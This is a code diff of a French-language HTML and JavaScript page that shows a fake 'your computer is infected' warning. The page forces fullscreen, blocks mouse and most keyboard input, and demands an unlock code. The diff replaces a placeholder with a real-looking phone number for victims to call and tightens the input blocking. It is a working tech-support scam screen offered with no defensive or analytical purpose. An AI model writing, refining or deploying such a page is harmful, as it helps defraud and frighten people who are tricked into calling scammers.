@@ -9,7 +9,7 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            user-select: none; /* Empêche la sélection de texte */
+            user-select: none;
         }
         html, body {
             width: 100vw;
@@ -35,8 +35,6 @@
         .message {
             font-size: 5vw;
             font-weight: bold;
-            text-align: center;
-            width: 90%;
         }
         .alert-number {
             font-size: 4vw;
@@ -52,7 +50,7 @@
             width: 50%;
             background: black;
             color: white;
-            ime-mode: disabled;
+            outline: none;
         }
         #error-message {
             color: red;
@@ -65,7 +63,7 @@
 
     <div class="container">
         <p class="message">⚠️ Votre ordinateur est infecté ⚠️<br>Appelez immédiatement :</p>
-        <p class="alert-number">+33 6 XX XX XX XX</p>
+        <p class="alert-number">+33 7 56 75 43 88</p>
         <p style="font-size: 3vw;">Entrez le code de déverrouillage :</p>
         <input type="password" id="codeInput" placeholder="Code secret">
         <p id="error-message"></p>
@@ -76,7 +74,6 @@
     </audio>
 
     <script>
-        // Ouvrir en plein écran immédiatement
         function openFullscreen() {
             let elem = document.documentElement;
             if (elem.requestFullscreen) {
@@ -91,48 +88,49 @@
         }
         openFullscreen();
 
-        // Désactiver la souris, le clic droit et la sélection de texte
-        document.addEventListener("contextmenu", event => event.preventDefault());
-        document.addEventListener("mousedown", event => event.preventDefault());
-        document.addEventListener("mouseup", event => event.preventDefault());
-        document.addEventListener("mousemove", event => event.preventDefault());
-
-        // Désactiver toutes les touches sauf le pavé numérique
+        // Désactiver les raccourcis clavier (F12, Ctrl+Shift+I, Échap, Alt+Tab, etc.)
         document.addEventListener("keydown", function(event) {
-            let allowedKeys = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "Enter", "Backspace"];
+            let allowedKeys = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "Enter", "Backspace", "Tab"];
             if (!allowedKeys.includes(event.key)) {
                 event.preventDefault();
             }
         });
 
-        // Empêcher de quitter la page
-        window.onbeforeunload = function() {
-            return "Votre ordinateur est bloqué, vous ne pouvez pas quitter cette page !";
-        };
-
-        // Vérifier si la fenêtre est réduite ou fermée (forcer le plein écran)
-        setInterval(() => {
-            if (document.hidden) {
-                openFullscreen();
+        // Désactiver les interactions souris (mais autoriser le champ de saisie)
+        document.addEventListener("contextmenu", event => event.preventDefault());
+        document.addEventListener("mousedown", function(event) {
+            if (event.target.id !== "codeInput") {
+                event.preventDefault();
             }
-        }, 500);
-
-        // Ajouter un son à chaque touche pressée
-        document.getElementById("codeInput").addEventListener("keydown", function(event) {
-            document.getElementById("keypress-sound").play();
         });
 
-        // Vérifier le code secret
-        document.getElementById("codeInput").addEventListener("keyup", function(event) {
+        // Ajouter un son à chaque touche pressée
+        let inputField = document.getElementById("codeInput");
+        let errorMessage = document.getElementById("error-message");
+        let sound = document.getElementById("keypress-sound");
+
+        inputField.addEventListener("keydown", function(event) {
+            if (!["Enter", "Backspace"].includes(event.key)) {
+                sound.play();
+            }
+        });
+
+        // Vérifier le code
+        inputField.addEventListener("keyup", function(event) {
             if (event.key === "Enter") {
                 if (this.value === "1234") {  
                     document.body.innerHTML = "<h1 style='color: white; text-align: center; margin-top: 20%; font-size: 5vw;'>✅ Système restauré</h1>";
                 } else {
-                    document.getElementById("error-message").innerText = "Code incorrect !";
+                    errorMessage.innerText = "Code incorrect !";
                     this.value = "";
                 }
             }
         });
+
+        // Focus automatique sur le champ
+        window.onload = function() {
+            inputField.focus();
+        };
     </script>
 
 </body>
